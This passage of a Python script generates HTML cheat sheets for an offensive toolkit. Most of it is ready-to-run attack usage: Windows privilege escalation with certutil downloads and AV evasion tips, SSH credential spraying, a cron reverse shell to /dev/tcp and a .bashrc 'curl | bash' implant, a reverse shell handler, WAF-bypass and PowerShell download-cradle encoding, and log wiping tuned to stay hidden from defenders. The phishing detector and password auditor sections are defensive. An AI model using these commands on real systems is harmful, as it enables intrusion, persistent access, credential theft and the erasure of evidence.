             "Automatically scans a compromised Linux machine for privilege escalation vectors and exploits them to reach root.",
             svg, steps, key)
    write_and_convert(folder, "privesc-linux-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 04 — auto_privesc-windows
# ─────────────────────────────────────────────────────────────────────────────
def make_privesc_windows():
    folder = f"{BASE}/04_Post_Exploitation/auto_privesc-windows"
    svg = flow_svg([
        ("gray",  "1. Transfer to Target",    "certutil / powershell download"),
        ("gray",  "2. Choose Version",        "Python script  or  PowerShell script"),
        ("coral", "3. Token / Service Scan",  "SeImpersonate, unquoted paths, weak perms"),
        ("coral", "4. Credential Hunt",       "cmdkey, AutoLogon, Unattend.xml, PS history"),
        ("blue",  "5. Registry / Tasks",      "AutoRun keys + SYSTEM scheduled tasks"),
        ("green", "6. Auto-Exploit",          "Runs the exploit or prints exact command"),
        ("green", "7. SYSTEM Shell",          "Verify with whoami /all"),
    ], height=570)

    steps = (
        step("Step 1 — Transfer to Target",
             pre("# On attacker machine\npython3 -m http.server 8000\n\n# On target (cmd)\ncertutil -urlcache -f http://&lt;ip&gt;:8000/autoprivesc_win.py autoprivesc_win.py\ncertutil -urlcache -f http://&lt;ip&gt;:8000/AutoPrivEsc.ps1 AutoPrivEsc.ps1")) +
        step("Step 2 — Choose Which Version to Run",
             table(["File", "Language", "Use when"],
                   [["autoprivesc_win.py", "Python 3", "Python is available on the target"],
                    ["AutoPrivEsc.ps1",    "PowerShell", "Python not available — works on Windows 7+"]])) +
        step("Step 2b — Run",
             pre("# Python version\npython autoprivesc_win.py\npython autoprivesc_win.py --no-exploit\n\n# PowerShell version\npowershell -ep bypass -f AutoPrivEsc.ps1\npowershell -ep bypass -f AutoPrivEsc.ps1 -NoExploit")) +
        step("Step 3–5 — Vectors Checked",
             table(["Vector", "Python", "PowerShell"],
                   [["Token Privileges (SeImpersonate, SeDebug)", "Yes", "Yes"],
                    ["AlwaysInstallElevated",                     "Yes", "Yes"],
                    ["Unquoted Service Paths",                    "Yes", "Yes"],
                    ["Weak Service Binary Permissions",           "Yes", "Yes"],
                    ["Stored Credentials (cmdkey, AutoLogon)",    "Yes", "Yes + PS history"],
                    ["AutoRun Registry Keys",                     "Yes", "Yes"],
                    ["Scheduled Tasks (SYSTEM, writable binary)", "Yes", "Yes"],
                    ["DLL Hijacking (writable PATH dirs)",        "Yes", "Yes"],
                    ["Weak Registry Permissions on Services",     "No",  "Yes"]])) +
        step("Step 6 — After Exploitation",
             pre("# Verify SYSTEM\nwhoami\nwhoami /all\n\n# If SeImpersonate found — use Potato exploit\n# Tool will suggest the exact potato variant"))
    )
    key = "Key idea: PowerShell version works on every Windows 7+ machine without Python. If AV blocks the script, encode it: certutil -encode AutoPrivEsc.ps1 enc.txt, then decode and run on target."
    h = html("AutoPrivEsc Windows — cheat sheet",
             "Scans a compromised Windows machine for privilege escalation vectors and exploits them to reach SYSTEM.",
             svg, steps, key)
    write_and_convert(folder, "privesc-windows-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 04 — lateral-movement
# ─────────────────────────────────────────────────────────────────────────────
def make_lateral():
    folder = f"{BASE}/04_Post_Exploitation/lateral-movement"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",    "pip install -r requirements.txt"),
        ("gray",  "2. Choose Mode",          "exec · scan · hop"),
        ("coral", "3. exec — Single Host",   "Run one command on one SSH target"),
        ("blue",  "4. scan — Spray Hosts",   "Try creds across multiple hosts in parallel"),
        ("blue",  "5. hop — Jump Chain",     "SSH through multiple boxes in sequence"),
        ("green", "6. Results",              "Command output per host, success/fail summary"),
    ], height=490)

    steps = (
        step("Step 1 — Install",
             pre("pip install -r requirements.txt")) +
        step("Step 2 — exec Mode (Single Host)",
             pre("# Password auth\npython3 lateral_movement.py exec -H 10.10.10.5 -u root -p password123 -c 'whoami'\n\n# Key auth\npython3 lateral_movement.py exec -H 10.10.10.5 -u admin -k ~/.ssh/id_rsa -c 'id'\n\n# Custom SSH port\npython3 lateral_movement.py exec -H 10.10.10.5 -u root -p pass --port 2222 -c 'ls /root'")) +
        step("Step 3 — scan Mode (Credential Spray)",
             pre("# Multiple hosts on command line\npython3 lateral_movement.py scan -H 10.10.10.1 10.10.10.2 10.10.10.3 -u admin -p pass123\n\n# Hosts from file\npython3 lateral_movement.py scan -f hosts.txt -u root -k ~/.ssh/id_rsa -c 'cat /etc/passwd'\n\n# Thread control\npython3 lateral_movement.py scan -f hosts.txt -u admin -p pass -t 10") +
             p("Hosts file: one IP or hostname per line.")) +
        step("Step 4 — hop Mode (Jump Chain)",
             pre("# Two-hop chain\npython3 lateral_movement.py hop -r 'user@10.10.10.1,admin@192.168.1.5' -c 'id' -p password\n\n# Custom port on second hop\npython3 lateral_movement.py hop -r 'user@10.10.10.1,admin@192.168.1.5:2222' -c 'whoami'") +
             p("The chain is specified as a comma-separated string of <code>user@host:port</code>. Each box is used as a jump host to reach the next.")) +
        step("Step 5 — Reading Results",
             pre("[+] 10.10.10.1   SUCCESS  root\n[+] 10.10.10.3   SUCCESS  root\n[-] 10.10.10.2   FAILED   Authentication failed\n\nSuccessful hosts: 2 / 3"))
    )
    key = "Key idea: use scan mode with a found credential on a discovered subnet to quickly identify where the same password works. Combine hop mode with compromised jump boxes to reach internal segments."
    h = html("Lateral Movement — cheat sheet",
             "SSH-based lateral movement: execute commands on single hosts, spray credentials across subnets, or chain through SSH jump boxes.",
             svg, steps, key)
    write_and_convert(folder, "lateral-movement-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 04 — persistence-manager
# ─────────────────────────────────────────────────────────────────────────────
def make_persistence():
    folder = f"{BASE}/04_Post_Exploitation/persistence-manager"
    svg = flow_svg([
        ("gray",  "1. Run on Target",        "python3 persistence_manager.py list"),
        ("gray",  "2. Choose Method",        "cron · bashrc · systemd · ssh_key"),
        ("coral", "3. Add Persistence",      "Installs the chosen persistence mechanism"),
        ("blue",  "4. Verify",               "Confirm it survives logout / reboot"),
        ("green", "5. Remove When Done",     "Clean up — same tool removes what it added"),
    ], height=415)

    steps = (
        step("Step 1 — List Methods",
             pre("python3 persistence_manager.py list")) +
        step("Step 2 — Cron Job",
             pre("# Add — reverse shell every reboot\npython3 persistence_manager.py cron add \\\n  -c \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1'\" \\\n  -i '@reboot'\n\n# Add — every 5 minutes\npython3 persistence_manager.py cron add \\\n  -c '/tmp/backdoor.sh' -i '*/5 * * * *'\n\n# Remove\npython3 persistence_manager.py cron remove -c '/tmp/backdoor'")) +
        step("Step 3 — .bashrc Injection",
             pre("# Add — runs when user opens a terminal\npython3 persistence_manager.py bashrc add \\\n  -c 'curl http://10.10.10.10/shell.sh | bash'\n\n# Remove\npython3 persistence_manager.py bashrc remove -c 'curl http://10.10.10.10'")) +
        step("Step 4 — Systemd Service (root required)",
             pre("# Add — starts on every boot as a service\npython3 persistence_manager.py systemd add \\\n  -n updater \\\n  -c '/usr/bin/python3 /tmp/backdoor.py'\n\n# Remove\npython3 persistence_manager.py systemd remove -n updater")) +
        step("Step 5 — SSH Key Implant",
             pre("# Add your public key to target's authorized_keys\npython3 persistence_manager.py ssh_key -k 'ssh-rsa AAAA...'") +
             p("After adding: <code>ssh user@target</code> with your private key — no password needed.")) +
        step("Step 6 — Remove When Done",
             table(["Method", "Leaves traces", "How to remove"],
                   [["cron",    "crontab entry", "cron remove -c &lt;pattern&gt;"],
                    ["bashrc",  ".bashrc line",  "bashrc remove -c &lt;pattern&gt;"],
                    ["systemd", "service file",  "systemd remove -n &lt;name&gt;"],
                    ["ssh_key", "authorized_keys line", "remove line manually or re-run tool"]]))
    )
    key = "Key idea: SSH key implant is the stealthiest — it blends in with legitimate keys and leaves no cron/service traces. Systemd is the most reliable for surviving reboots but requires root and creates a file on disk."
    h = html("Persistence Manager — cheat sheet",
             "Linux persistence tool supporting cron jobs, .bashrc injection, systemd services, and SSH key implants.",
             svg, steps, key)
    write_and_convert(folder, "persistence-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# 04 — reverse-shell-manager
# ─────────────────────────────────────────────────────────────────────────────
def make_rsm():
    folder = f"{BASE}/04_Post_Exploitation/reverse-shell-manager"
    svg = flow_svg([
        ("gray",  "1. Start the Listener",   "python3 rsm.py -p 4444"),
        ("coral", "2. Deploy Payload",        "Trigger reverse shell on target"),
        ("coral", "3. Session Connects",      "RSM accepts and logs the connection"),
        ("blue",  "4. Interact",              "interact &lt;id&gt; — drop into shell"),
        ("blue",  "5. Background Sessions",   "Ctrl+C — session stays alive in background"),
        ("green", "6. Manage",                "sessions · kill · history commands"),
    ], height=490)

    steps = (
        step("Step 1 — Start RSM",
             pre("# Default port 4444\npython3 rsm.py\n\n# Custom port\npython3 rsm.py -p 9001\n\n# Multiple ports at once\npython3 rsm.py -p 4444 -p 5555 -p 6666\n\n# Enable session logging to disk\npython3 rsm.py -p 4444 --log")) +
        step("Step 2 — Deploy a Payload",
             p("Use payload-generator to create the reverse shell, then trigger it on the target. Once it connects, RSM shows:") +
             pre("[+] New connection from 10.10.10.5:54321\n[*] OS fingerprint: Linux ubuntu 5.15.0\n[*] Session ID: 1")) +
        step("Step 3 — RSM Commands",
             table(["Command", "What it does"],
                   [["sessions",          "List all active sessions with ID, IP, OS"],
                    ["interact &lt;id&gt;","Drop into interactive shell with that session"],
                    ["kill &lt;id&gt;",   "Kill a specific session"],
                    ["kill all",          "Kill all sessions"],
                    ["history &lt;id&gt;","Show command history for a session"],
                    ["upload &lt;id&gt;", "Show file transfer one-liners for that session"]])) +
        step("Step 4 — Interacting with a Session",
             pre("rsm> interact 1\n[*] Interacting with session 1 (10.10.10.5)\n\n$ whoami\nwww-data\n$ id\nuid=33(www-data) gid=33(www-data)\n\n# Press Ctrl+C to background the session (keeps it alive)\n[*] Backgrounded session 1")) +
        step("Step 5 — File Transfer One-liners",
             pre("# RSM provides these per-session:\nupload 1\n\n# Example output:\n[*] Upload methods for session 1:\n  wget http://&lt;your-ip&gt;:8000/file.sh -O /tmp/file.sh\n  curl http://&lt;your-ip&gt;:8000/file.sh -o /tmp/file.sh\n  base64 &lt; localfile | ssh ... (for SSH sessions)"))
    )
    key = "Key idea: RSM handles multiple simultaneous connections on multiple ports — use different ports for different payloads so you know which target connected on which port. --log saves everything for reporting."
    h = html("Reverse Shell Manager — cheat sheet",
             "Lightweight multi-session reverse shell handler. No Metasploit needed — pure Python, zero dependencies.",
             svg, steps, key)
    write_and_convert(folder, "rsm-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# Utilities — encoder-decoder
# ─────────────────────────────────────────────────────────────────────────────
def make_encoder():
    folder = f"{BASE}/Utilities/encoder-decoder"
    svg = flow_svg([
        ("gray",  "1. Run with Operation",   "python3 encoder_decoder.py &lt;op&gt; &lt;input&gt;"),
        ("coral", "2. Choose Operation",      "b64enc · hexenc · urlenc · xorenc · ..."),
        ("blue",  "3. Input Methods",         "Inline · pipe · from file (-f)"),
        ("green", "4. Encoded Output",        "Printed to stdout — pipe or redirect"),
    ], height=335)

    steps = (
        step("Step 1 — Basic Usage",
             pre("python3 encoder_decoder.py &lt;operation&gt; &lt;input&gt;\n\n# Examples\npython3 encoder_decoder.py b64enc 'hello world'\npython3 encoder_decoder.py b64dec 'aGVsbG8gd29ybGQ='\npython3 encoder_decoder.py urlenc '/etc/passwd'\npython3 encoder_decoder.py hexenc 'cmd.exe'\npython3 encoder_decoder.py xorenc 'payload' -k 'secretkey'")) +
        step("Step 2 — All Supported Operations",
             table(["Operation", "Description"],
                   [["b64enc / b64dec",         "Standard Base64 encode / decode"],
                    ["b64url-enc / b64url-dec",  "URL-safe Base64 (uses - and _ instead of + and /)"],
                    ["hexenc / hexdec",           "Hex encode / decode"],
                    ["urlenc / urldec",           "URL percent-encoding (encodes special chars)"],
                    ["urlenc-full",               "Full URL encoding — encodes every character"],
                    ["htmlenc / htmldec",         "HTML entity encoding / decoding"],
                    ["rot13",                     "ROT13 Caesar cipher"],
                    ["xorenc / xordec",           "XOR with a key — requires -k &lt;key&gt;"],
                    ["binenc / bindec",           "Binary (0s and 1s) encode / decode"]])) +
        step("Step 3 — Input Methods",
             pre("# Inline string\npython3 encoder_decoder.py b64enc 'my payload'\n\n# Pipe from stdin\necho 'test' | python3 encoder_decoder.py b64enc\n\n# From file\npython3 encoder_decoder.py b64enc -f shell.sh\n\n# XOR requires key\npython3 encoder_decoder.py xorenc 'data' -k 'mykey'")) +
        step("Step 4 — Practical Payload Crafting",
             pre("# Double-encode for WAF bypass\npython3 encoder_decoder.py urlenc '&lt;script&gt;alert(1)&lt;/script&gt;'\n# then encode again:\npython3 encoder_decoder.py b64enc '%3Cscript%3Ealert%281%29%3C%2Fscript%3E'\n\n# Encode PowerShell payload for -EncodedCommand\npython3 encoder_decoder.py b64enc 'IEX(New-Object Net.WebClient).DownloadString(...)'"))
    )
    key = "Key idea: combine operations for WAF bypass — URL-encode, then base64-encode the result. Use xorenc for lightweight obfuscation when you need to avoid signature detection on static strings."
    h = html("Encoder / Decoder — cheat sheet",
             "Encodes and decodes data in multiple formats. Useful for payload crafting, obfuscation, and WAF bypass.",
             svg, steps, key)
    write_and_convert(folder, "encoder-decoder-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# Utilities — hash-cracker
# ─────────────────────────────────────────────────────────────────────────────
def make_hash_cracker():
    folder = f"{BASE}/Utilities/hash-cracker"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",    "python3 hash_cracker.py"),
        ("gray",  "2. Provide Wordlist",      "Default: /usr/share/wordlists/rockyou.txt"),
        ("coral", "3. Choose Mode",           "Single hash  or  Batch from file"),
        ("coral", "4. Auto-Detect Hash Type", "MD5 · SHA1 · SHA256 · SHA512 · NTLM · bcrypt"),
        ("blue",  "5. Dictionary Attack",     "Hashes each word, compares to target"),
        ("green", "6. Result",                "Cracked password or exhausted wordlist"),
    ], height=490)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\npython3 hash_cracker.py")) +
        step("Step 2 — Choose a Wordlist",
             pre("# Built-in on Kali / Parrot\n/usr/share/wordlists/rockyou.txt       (14M passwords)\n/usr/share/wordlists/fasttrack.txt     (222 common passwords)\n\n# Download larger lists\nhttps://github.com/danielmiessler/SecLists  (many options)") +
             p("Press Enter at the wordlist prompt to use the rockyou.txt default.")) +
        step("Step 3 — Two Modes",
             table(["Mode", "When to use"],
                   [["1 — Single hash", "You have one hash to crack — paste it manually"],
                    ["2 — Batch mode",  "You have a file of hashes (one per line) — e.g. from /etc/shadow dump"]])) +
        step("Step 4 — Supported Hash Types (Auto-Detected)",
             table(["Type", "Example hash (truncated)", "Common source"],
                   [["MD5",    "5f4dcc3b5aa765d61d...", "Old web apps, databases"],
                    ["SHA1",   "5baa61e4c9b93f3f...",   "Git, older systems"],
                    ["SHA256",  "5e884898da2804...",     "Modern Linux shadow files"],
                    ["SHA512",  "b109f3bbbc244...",      "Modern Linux shadow files (preferred)"],
                    ["NTLM",    "8846f7eaee8fb1...",    "Windows SAM / Active Directory"],
                    ["bcrypt",  "$2b$12$...",            "Modern web apps (slow to crack)"]])) +
        step("Step 5 — Reading Results",
             pre("[*] Detected hash type: MD5\n[*] Cracking: 5f4dcc3b5aa765d61d8327deb882cf99\n[*] Speed: 45,231 attempts/sec\n\n[+] CRACKED in 0.07s after 3,241 attempts!\n\nHash     : 5f4dcc3b5aa765d61d8327deb882cf99\nPassword : password") +
             p("Batch mode prints a summary table with cracked / failed counts after processing all hashes."))
    )
    key = "Key idea: bcrypt is intentionally slow — cracking even a weak bcrypt password can take hours. For NTLM hashes from Windows, rockyou.txt is usually enough for weak passwords. For SHA256/SHA512 from /etc/shadow, add rules with hashcat for better coverage."
    h = html("Hash Cracker — cheat sheet",
             "Dictionary attack tool for cracking password hashes. Auto-detects MD5, SHA1, SHA256, SHA512, NTLM, and bcrypt.",
             svg, steps, key)
    write_and_convert(folder, "hash-cracker-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# Utilities — log-cleaner
# ─────────────────────────────────────────────────────────────────────────────
def make_log_cleaner():
    folder = f"{BASE}/Utilities/log-cleaner"
    svg = flow_svg([
        ("gray",  "1. List Log Status",      "python3 log_cleaner.py list"),
        ("coral", "2. Choose Scope",         "single file · category · full clean"),
        ("coral", "3. Surgical Remove",      "grep-remove — delete lines matching your IP"),
        ("blue",  "4. Clear / Truncate",     "Wipes log content (optionally overwrites first)"),
        ("green", "5. Verify",               "python3 log_cleaner.py list — confirm cleared"),
    ], height=415)

    steps = (
        step("Step 1 — List All Tracked Logs",
             pre("python3 log_cleaner.py list\n\n# Output shows:\n#   Category       Path                      Status\n#   auth           /var/log/auth.log         1.2 MB\n#   bash_history   /root/.bash_history       3.1 KB\n#   apache         /var/log/apache2/access   8.4 MB")) +
        step("Step 2 — Clear by Category",
             pre("python3 log_cleaner.py clear auth\npython3 log_cleaner.py clear bash_history\npython3 log_cleaner.py clear apache") +
             table(["Category", "Paths it clears"],
                   [["auth",         "/var/log/auth.log, /var/log/secure"],
                    ["syslog",       "/var/log/syslog, /var/log/messages"],
                    ["lastlog",      "/var/log/lastlog"],
                    ["wtmp",         "/var/log/wtmp"],
                    ["btmp",         "/var/log/btmp"],
                    ["bash_history", "~/.bash_history, /root/.bash_history"],
                    ["apache",       "/var/log/apache2/access.log, error.log"],
                    ["nginx",        "/var/log/nginx/access.log, error.log"]])) +
        step("Step 3 — Surgical Line Removal (grep-remove)",
             p("Removes only lines matching your IP / username — leaves the rest of the log intact (less suspicious):") +
             pre("python3 log_cleaner.py grep-remove -f /var/log/auth.log -p '10.10.10.10'\npython3 log_cleaner.py grep-remove -f /var/log/nginx/access.log -p '10.10.10.10'")) +
        step("Step 4 — Full Clean",
             pre("# Clear all categories at once\npython3 log_cleaner.py full\n\n# With secure overwrite (writes random data before truncating)\npython3 log_cleaner.py full --overwrite\n\n# Skip specific categories\npython3 log_cleaner.py full --skip apache nginx") +
             warn("Most system logs require root. Run as root or via sudo."))
    )
    key = "Key idea: grep-remove is safer than full clear — a log file that is completely empty looks suspicious to a defender. Surgical removal of your specific IP/session is less detectable than wiping the entire file."
    h = html("Log Cleaner — cheat sheet",
             "Clears Linux system logs and shell history to remove traces after a session. Supports surgical line removal or full wipe.",
             svg, steps, key)
    write_and_convert(folder, "log-cleaner-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# Utilities — password-auditor
# ─────────────────────────────────────────────────────────────────────────────
def make_password_auditor():
    folder = f"{BASE}/Utilities/password-auditor"
    svg = flow_svg([
        ("gray",  "1. Run the Tool",         "python3 password_auditor.py passwords.txt"),
        ("coral", "2. Per-Password Analysis","Length · diversity · common lists · entropy"),
        ("coral", "3. Grade Assignment",      "A (strong) → F (critical)"),
        ("blue",  "4. Pattern Detection",    "Keyboard walks · leet speak · word+number"),
        ("green", "5. Dataset Report",       "Grade distribution + remediation advice"),
    ], height=415)

    steps = (
        step("Step 1 — Run",
             pre("# No pip install needed — pure Python 3\npython3 password_auditor.py passwords.txt\n\n# Show top N weakest\npython3 password_auditor.py passwords.txt --worst 20\n\n# Save report\npython3 password_auditor.py passwords.txt -o report.txt")) +
        step("Step 2 — What Gets Checked Per Password",
             table(["Check", "What it catches"],
                   [["Length",           "Under 8 (fail), under 12 (weak), 12+ (good)"],
                    ["Character classes","Missing uppercase, lowercase, digits, symbols"],
                    ["Common passwords", "Top 200 from rockyou / breach lists"],
                    ["Keyboard walks",   "qwerty, 12345, 1q2w3e, asdfgh"],
                    ["Repeated chars",   "aaa, 111, zzzzz"],
                    ["Dictionary words", "password, admin, welcome, dragon"],
                    ["Leet speak",       "p4ssw0rd, @dm1n, s3cur3 — detected and penalized"],
                    ["Digit-only",       "123456, 19901225"],
                    ["Word+number",      "password1, admin123, football99"],
                    ["Shannon entropy",  "Bits of entropy based on character pool and length"]])) +
        step("Step 3 — Grading Scale",
             table(["Grade", "Score", "Meaning"],
                   [["A", "80-100", "Strong — meets modern standards"],
                    ["B", "65-79",  "Good — minor improvements suggested"],
                    ["C", "50-64",  "Moderate — notable weaknesses"],
                    ["D", "35-49",  "Weak — needs improvement"],
                    ["F", "0-34",   "Critical — immediate reset required"]])) +
        step("Step 4 — Dataset Report",
             pre("Grade Distribution:\n  A |#####           | 12%\n  B |########        | 18%\n  C |#############   | 28%\n  D |##########      | 22%\n  F |##########      | 20%\n\nTop weakness patterns:\n  1. Common password     (41%)\n  2. Word + number suffix (28%)\n  3. Keyboard walk        (19%)\n\nRemediation: enforce 12+ char minimum, reject common patterns"))
    )
    key = "Key idea: use this after a credential dump or during an internal audit. The dataset report's pattern analysis tells you what policy to enforce — if 40% of passwords end in a number, your policy needs a rule against it."
    h = html("Password Auditor — cheat sheet",
             "Analyzes a list of passwords from a dump or audit, grades each A–F, and generates a remediation report.",
             svg, steps, key)
    write_and_convert(folder, "password-auditor-cheatsheet", h)

# ─────────────────────────────────────────────────────────────────────────────
# Utilities — phishing-detector
# ─────────────────────────────────────────────────────────────────────────────
def make_phishing_detector():
    folder = f"{BASE}/Utilities/phishing-detector"
    svg = flow_svg([
        ("gray",  "1. Install &amp; Run",    "pip install -r requirements.txt"),
        ("gray",  "2. Provide URL",          "Interactive prompt or -u flag"),
        ("coral", "3. URL Structure Check",  "IP · subdomains · TLD · @ trick · hyphens"),
        ("coral", "4. Domain Age (WHOIS)",   "New domain = high risk"),
        ("blue",  "5. SSL / HTML / Entropy", "Cert age · password forms · brand impersonation"),
        ("green", "6. Risk Score (0-100)",   "LOW / MEDIUM / HIGH / CRITICAL verdict"),
    ], height=490)

    steps = (
        step("Step 1 — Install &amp; Run",
             pre("pip install -r requirements.txt\n\n# Interactive mode\npython3 phishing_detector.py\n\n# Direct URL\npython3 phishing_detector.py -u https://suspicious-site.com\n\n# With VirusTotal API key (optional)\npython3 phishing_detector.py -u https://site.com --vt-key YOUR_API_KEY")) +
        step("Step 2 — Six Checks Explained",
             table(["Check", "What it looks for", "Red flags"],
                   [["URL Structure",  "Domain anatomy",          "Raw IP, excessive subdomains, @ trick, suspicious TLD"],
                    ["Domain Age",     "WHOIS registration date", "Domain registered under 30 days ago"],
                    ["SSL Cert",       "Certificate details",     "Free CA, no HTTPS, newly issued cert, domain mismatch"],
                    ["HTML Content",   "Page source analysis",    "Password forms to external domains, phishing keywords"],
                    ["Domain Entropy", "Randomness + typosquat",  "High entropy (DGA), paypa1, g00gle substitutions"],
                    ["VirusTotal",     "Vendor reputation",       "Any vendor flagged the URL (requires API key)"]])) +
        step("Step 3 — Reading the Score",
             pre("URL: https://paypa1.secure-verify.tk/login\n\nCheck Results:\n  URL Structure    : HIGH     (25/25)  raw IP, suspicious TLD\n  Domain Age       : HIGH     (20/20)  registered 3 days ago\n  SSL Certificate  : MEDIUM   (10/15)  free CA, 2 days old\n  HTML Content     : HIGH     (20/20)  password form + phishing keywords\n  Domain Entropy   : MEDIUM   (10/10)  typosquat: paypa1 ~ paypal\n  VirusTotal       : —                 (no API key)\n\nFINAL RISK SCORE : 85/100\nVERDICT          : CRITICAL — Very likely phishing") +
             table(["Score", "Verdict"],
                   [["0-30",   "LOW — likely safe"],
                    ["31-50",  "MEDIUM — investigate further"],
                    ["51-70",  "HIGH — likely malicious"],
                    ["71-100", "CRITICAL — very likely phishing"]])) +
        step("Step 4 — VirusTotal Integration",
             pre("# Get a free API key at virustotal.com\npython3 phishing_detector.py -u https://site.com --vt-key abc123xyz\n\n# Or set as env var\nexport VT_API_KEY=abc123xyz\npython3 phishing_detector.py -u https://site.com"))
    )
    key = "Key idea: a newly registered domain (under 30 days) with HTTPS and no VirusTotal flags can still be a phishing page — SSL is free and easy. Domain age + HTML content analysis catch these early-stage pages."
    h = html("Phishing Detector — cheat sheet",
             "Analyzes any URL and returns a risk score (0–100) covering domain structure, age, SSL, HTML content, and brand impersonation.",
             svg, steps, key)
    write_and_convert(folder, "phishing-detector-cheatsheet", h)


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("[*] Generating cheatsheets for all red_team tools...\n")
    make_email_enum()
    make_subdomain_enum()
    make_harvester()
    make_whois()
    make_cve_scanner()
    make_dir_enum()
    make_net_intel()
    make_exploit_suggester()
    make_payload_gen()
    make_privesc_linux()
    make_privesc_windows()
    make_lateral()
    make_persistence()
    make_rsm()
    make_encoder()
    make_hash_cracker()
    make_log_cleaner()
    make_password_auditor()
    make_phishing_detector()
    print("\n[+] Done.")
